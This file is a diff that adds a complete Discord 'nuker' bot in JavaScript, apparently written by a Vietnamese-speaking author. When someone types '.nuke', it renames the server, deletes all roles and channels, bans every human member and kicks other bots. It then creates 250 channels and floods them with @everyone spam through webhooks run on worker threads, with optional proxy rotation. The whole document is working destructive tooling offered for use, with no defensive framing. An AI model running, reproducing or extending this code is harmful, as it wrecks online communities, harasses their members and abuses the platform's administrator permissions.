@@ -1,0 +1,229 @@
+const { Client, GatewayIntentBits, REST, Routes, ChannelType } = require('discord.js');
+const axios = require('axios');
+const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
+const fs = require('fs');
+const path = require('path');
+
+// ======================== CẤU HÌNH ========================
+const TOKEN = 'BOT_TOKEN_HERE';
+const PREFIX = '.nuke';
+const SERVER_NAME = 'NUKED BY POTATO';
+const CHANNEL_PREFIX = 'potato-nuke';
+const WEBHOOK_NAME = 'PotatoNukerX';
+const SPAM_CONTENT = '@everyone **🔥🔥🔥 SERVER IS BEING NUCLEARLY ANNIHILATED 🔥🔥🔥**\nhttps://media.tenor.com/3b9o9QZxUZoAAAAC/nuke-bomb.gif';
+const SPAM_EMBED_TITLE = '💀 TOTAL DESTRUCTION 💀';
+const SPAM_EMBED_COLOR = '#FF0000';
+
+const DELETE_CHANNELS = true;
+const CREATE_CHANNELS = true;
+const CHANNEL_COUNT = 250;
+const SPAM_WEBHOOKS = true;
+const SPAM_ROUNDS = 12;
+const SPAM_DELAY_MS = 300;
+const BAN_ALL_MEMBERS = true;
+const KICK_OTHER_BOTS = true;
+const RENAME_SERVER = true;
+const DELETE_ROLES = true;
+
+const USE_MULTI_THREAD = true;
+const THREAD_COUNT = 4;
+const ENABLE_PROXY = false;
+const PROXY_LIST_PATH = './proxies.txt';
+
+// ======================== UTILS ========================
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+const log = (msg, type = 'INFO') => {
+    const colors = { INFO: '\x1b[36m', SUCCESS: '\x1b[32m', WARN: '\x1b[33m', ERROR: '\x1b[31m', NUKE: '\x1b[35m' };
+    console.log(`${colors[type] || colors.INFO}[${type}] ${msg}\x1b[0m`);
+};
+const getProxies = () => ENABLE_PROXY && fs.existsSync(PROXY_LIST_PATH) ? fs.readFileSync(PROXY_LIST_PATH, 'utf8').split('\n').filter(l => l.trim()) : [];
+
+// ======================== WEBHOOK SPAM WORKER ========================
+if (!isMainThread) {
+    (async () => {
+        const { channelId, webhookUrl, rounds, delay, proxyList } = workerData;
+        let webhookId, webhookToken;
+        if (webhookUrl) {
+            const match = webhookUrl.match(/\/webhooks\/(\d+)\/(.+)$/);
+            if (match) [webhookId, webhookToken] = [match[1], match[2]];
+        }
+        for (let r = 0; r < rounds; r++) {
+            try {
+                const proxy = proxyList.length ? { proxy: { host: proxyList[r % proxyList.length].split(':')[0], port: parseInt(proxyList[r % proxyList.length].split(':')[1]) } } : {};
+                await axios.post(`https://discord.com/api/v10/webhooks/${webhookId}/${webhookToken}`, {
+                    content: SPAM_CONTENT,
+                    username: WEBHOOK_NAME,
+                    avatar_url: 'https://i.imgur.com/6Xr2j9l.png',
+                    embeds: [{ title: SPAM_EMBED_TITLE, color: 0xFF0000, description: `Round ${r + 1}/${rounds}` }]
+                }, { ...proxy, headers: { 'Content-Type': 'application/json' } });
+                parentPort.postMessage({ channelId, round: r + 1, success: true });
+            } catch (err) {
+                parentPort.postMessage({ channelId, round: r + 1, success: false, error: err.message });
+            }
+            await sleep(delay);
+        }
+        parentPort.postMessage({ channelId, done: true });
+    })();
+    return;
+}
+
+// ======================== MAIN CLIENT ========================
+const client = new Client({
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildMembers,
+        GatewayIntentBits.GuildWebhooks
+    ]
+});
+
+async function deleteAllRoles(guild) {
+    log(`Deleting all roles (except @everyone) in ${guild.name}`, 'NUKE');
+    const roles = guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed);
+    for (const role of roles.values()) {
+        try { await role.delete(); log(`Deleted role: ${role.name}`, 'SUCCESS'); }
+        catch (e) { log(`Failed delete role ${role.name}: ${e.message}`, 'ERROR'); }
+        await sleep(100);
+    }
+}
+
+async function renameServer(guild, newName) {
+    try { await guild.setName(newName); log(`Server renamed to: ${newName}`, 'SUCCESS'); }
+    catch (e) { log(`Failed rename server: ${e.message}`, 'ERROR'); }
+}
+
+async function deleteAllChannels(guild) {
+    log(`Deleting all channels (${guild.channels.cache.size})`, 'NUKE');
+    for (const channel of guild.channels.cache.values()) {
+        try { await channel.delete(); log(`Deleted: ${channel.name}`, 'SUCCESS'); }
+        catch (e) { log(`Failed delete ${channel.name}: ${e.message}`, 'ERROR'); }
+        await sleep(80);
+    }
+}
+
+async function createMassChannels(guild, count) {
+    log(`Creating ${count} channels`, 'NUKE');
+    const promises = [];
+    for (let i = 1; i <= count; i++) {
+        const promise = guild.channels.create({
+            name: `${CHANNEL_PREFIX}-${i}`,
+            type: ChannelType.GuildText,
+            reason: 'Nuke operation'
+        }).then(ch => log(`Created: ${ch.name}`, 'SUCCESS')).catch(e => log(`Failed create #${i}: ${e.message}`, 'ERROR'));
+        promises.push(promise);
+        await sleep(60);
+    }
+    await Promise.all(promises);
+}
+
+async function getOrCreateWebhook(channel) {
+    try {
+        const webhooks = await channel.fetchWebhooks();
+        let webhook = webhooks.find(w => w.name === WEBHOOK_NAME);
+        if (!webhook) webhook = await channel.createWebhook({ name: WEBHOOK_NAME, avatar: 'https://i.imgur.com/6Xr2j9l.png' });
+        return webhook;
+    } catch { return null; }
+}
+
+async function spamWebhooksMultiThread(guild, rounds, delayPerRound) {
+    log(`Spamming webhooks with ${THREAD_COUNT} threads, ${rounds} rounds`, 'NUKE');
+    const channels = guild.channels.cache.filter(c => c.isTextBased() && c.viewable);
+    const proxyList = getProxies();
+    const workers = [];
+    for (const [id, channel] of channels) {
+        const webhook = await getOrCreateWebhook(channel);
+        if (!webhook) continue;
+        const worker = new Worker(__filename, {
+            workerData: {
+                channelId: id,
+                webhookUrl: webhook.url,
+                rounds: rounds,
+                delay: delayPerRound,
+                proxyList: proxyList
+            }
+        });
+        worker.on('message', (msg) => {
+            if (msg.success) log(`[Thread] Channel ${msg.channelId} round ${msg.round} sent`, 'SUCCESS');
+            else if (!msg.done) log(`[Thread] Channel ${msg.channelId} round ${msg.round} failed: ${msg.error}`, 'ERROR');
+        });
+        workers.push(worker);
+        await sleep(50);
+    }
+    await Promise.all(workers.map(w => new Promise(resolve => w.on('exit', resolve))));
+}
+
+async function banAllMembers(guild) {
+    log(`Banning all members (excluding bot itself)`, 'NUKE');
+    const members = await guild.members.fetch();
+    for (const member of members.values()) {
+        if (member.user.bot) continue;
+        try { await member.ban({ reason: 'Nuke operation' }); log(`Banned: ${member.user.tag}`, 'SUCCESS'); }
+        catch (e) { log(`Failed ban ${member.user.tag}: ${e.message}`, 'ERROR'); }
+        await sleep(60);
+    }
+}
+
+async function kickOtherBots(guild) {
+    log(`Kicking other bots`, 'NUKE');
+    const members = await guild.members.fetch();
+    for (const member of members.values()) {
+        if (member.user.bot && member.user.id !== client.user.id) {
+            try { await member.kick('Nuke operation'); log(`Kicked bot: ${member.user.tag}`, 'SUCCESS'); }
+            catch (e) { log(`Failed kick bot ${member.user.tag}: ${e.message}`, 'ERROR'); }
+            await sleep(50);
+        }
+    }
+}
+
+async function fullNuke(guild) {
+    log(`========== STARTING FULL NUCLEAR STRIKE ON: ${guild.name} ==========`, 'NUKE');
+    if (RENAME_SERVER) await renameServer(guild, SERVER_NAME);
+    if (DELETE_ROLES) await deleteAllRoles(guild);
+    if (BAN_ALL_MEMBERS) await banAllMembers(guild);
+    if (KICK_OTHER_BOTS) await kickOtherBots(guild);
+    if (DELETE_CHANNELS) await deleteAllChannels(guild);
+    if (CREATE_CHANNELS) await createMassChannels(guild, CHANNEL_COUNT);
+    if (SPAM_WEBHOOKS) await spamWebhooksMultiThread(guild, SPAM_ROUNDS, SPAM_DELAY_MS);
+    log(`========== NUKE COMPLETED ON: ${guild.name} ==========`, 'SUCCESS');
+}
+
+// ======================== COMMAND HANDLER ========================
+client.once('ready', () => {
+    log(`✅ Logged in as ${client.user.tag} | Bot ID: ${client.user.id}`, 'SUCCESS');
+    log(`🔧 Use "${PREFIX}" in any server channel to start the ultimate nuke.`, 'INFO');
+    log(`🔥 Multi-threading: ${USE_MULTI_THREAD ? 'ENABLED' : 'DISABLED'} | Threads: ${THREAD_COUNT}`, 'INFO');
+    if (ENABLE_PROXY) log(`🌐 Proxy mode: ENABLED (${getProxies().length} proxies loaded)`, 'INFO');
+});
+
+client.on('messageCreate', async (message) => {
+    if (message.author.bot) return;
+    if (!message.content.startsWith(PREFIX)) return;
+
+    const guild = message.guild;
+    if (!guild) return message.reply('❌ This command only works in a server.');
+    const botMember = guild.members.me;
+    if (!botMember.permissions.has('Administrator')) {
+        return message.reply('❌ Bot needs **Administrator** permission. Cannot proceed.');
+    }
+
+    await message.reply('💣 **ULTIMATE NUKE ACTIVATED** – Watch console for live destruction log. 🔥');
+    try {
+        await fullNuke(guild);
+    } catch (err) {
+        log(`Critical error in nuke process: ${err.stack}`, 'ERROR');
+        await message.reply(`⚠️ Something went wrong: ${err.message}. But don't worry – I'll keep fighting. Type ${PREFIX} again.`);
+    }
+});
+
+client.login(TOKEN).catch(err => {
+    log(`FATAL: Cannot login – ${err.message}`, 'ERROR');
+    process.exit(1);
+});
+
+// ======================== AUTO-RECONNECT & ERROR HANDLING ========================
+process.on('uncaughtException', (err) => log(`Uncaught Exception: ${err}`, 'ERROR'));
+process.on('unhandledRejection', (err) => log(`Unhandled Rejection: ${err}`, 'ERROR'));
+
+// Graceful shutdown
+process.on('SIGINT', () => { log('Shutting down...', 'WARN'); client.destroy(); process.exit(0); });
